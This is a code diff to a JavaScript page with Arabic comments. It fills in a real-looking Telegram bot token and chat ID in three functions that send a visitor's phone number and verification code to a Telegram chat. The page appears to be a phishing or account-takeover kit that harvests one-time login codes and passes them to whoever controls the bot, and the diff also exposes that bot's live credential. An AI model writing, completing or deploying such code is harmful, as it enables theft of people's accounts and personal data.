@@ -491,8 +491,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // وظيفة إرسال البيانات الكاملة للمستخدم إلى التلجرام
     function sendCompleteUserDataToTelegram(phoneNumber) {
-        const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بتوكن بوتك الحقيقي
-        const chatId = 'YOUR_CHAT_ID';     // استبدل هذا بمعرف الدردشة الحقيقي
+        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
+        const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
         
         const message = `👤 *بيانات المستخدم الكاملة*\n\n` +
                        `📱 *رقم الهاتف:* ${phoneNumber}\n` +
@@ -535,8 +535,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // وظيفة إرسال بيانات التحقق الكاملة إلى التلجرام
     function sendVerificationDataToTelegram(phoneNumber, code) {
-        const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بتوكن بوتك الحقيقي
-        const chatId = 'YOUR_CHAT_ID';     // استبدل هذا بمعرف الدردشة الحقيقي
+        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
+        const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
         
         const message = `🔐 *بيانات التحقق الكاملة*\n\n` +
                        `📱 *رقم الهاتف:* ${phoneNumber}\n` +
@@ -580,8 +580,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // وظيفة إرسال طلب إعادة الإرسال مع البيانات الكاملة إلى التلجرام
     function sendResendRequestWithUserDataToTelegram(phoneNumber) {
-        const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بتوكن بوتك الحقيقي
-        const chatId = 'YOUR_CHAT_ID';     // استبدل هذا بمعرف الدردشة الحقيقي
+        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
+        const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
         
         const message = `🔄 *طلب إعادة إرسال مع البيانات الكاملة*\n\n` +
                        `📱 *رقم الهاتف:* ${phoneNumber}\n` +
